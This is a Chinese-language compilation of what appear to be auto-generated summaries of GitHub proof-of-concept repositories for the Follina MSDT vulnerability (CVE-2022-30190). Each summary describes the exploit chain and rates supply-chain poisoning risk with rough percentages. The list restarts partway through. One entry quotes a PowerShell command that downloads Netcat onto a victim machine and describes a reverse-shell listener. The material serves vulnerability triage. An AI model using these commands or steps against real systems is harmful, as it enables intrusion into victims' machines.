CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

